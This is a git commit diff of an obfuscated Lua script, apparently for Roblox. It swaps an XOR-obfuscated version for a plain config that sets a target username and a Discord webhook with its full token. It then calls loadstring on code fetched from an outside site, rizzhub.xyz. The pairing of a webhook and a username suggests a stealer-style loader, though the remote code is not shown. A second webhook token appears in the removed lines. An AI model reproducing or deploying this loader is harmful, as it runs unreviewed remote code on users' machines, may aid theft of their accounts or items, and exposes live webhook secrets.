c37d02cac2788edc62256c08b78ef3c9173f5496
zVladd <130866135+zVladd@users.noreply.github.com>
2023-04-16 13:56:24 +0300

    Update obf_Y0AkMvGJ9KS83E2x4a9BsFfBh5Ju48PN33i2p6MQ8a5Qnntn9P84Hc2tN5x3IE3I.lua

--- obf_Y0AkMvGJ9KS83E2x4a9BsFfBh5Ju48PN33i2p6MQ8a5Qnntn9P84Hc2tN5x3IE3I.lua
+++ obf_Y0AkMvGJ9KS83E2x4a9BsFfBh5Ju48PN33i2p6MQ8a5Qnntn9P84Hc2tN5x3IE3I.lua
@@ -1,12 +1,4 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 
+UserName = "zVladdd1"
+Webhook = "https://discord.com/api/webhooks/1097113168335089694/BnYVt7VwD0nBWnydTf7JhgNxWWC9iN5DTiTw31xDRmFoV1U9voV3lXt67NvyZFEFotdv"
 
-]]--
-
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end UserName=v7("\250\135\124\239\142\168\228\224","\128\209\16\142\234\204");Webhook="https://discord.com/api/webhooks/1096873093592526940/Q9mKkHwKb7I8gea1xXaas-cX6iiuU5M3dHLcUbneJgBYYfz6vVcBBjWZaQuT1--8oc_V";loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua",true))();
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
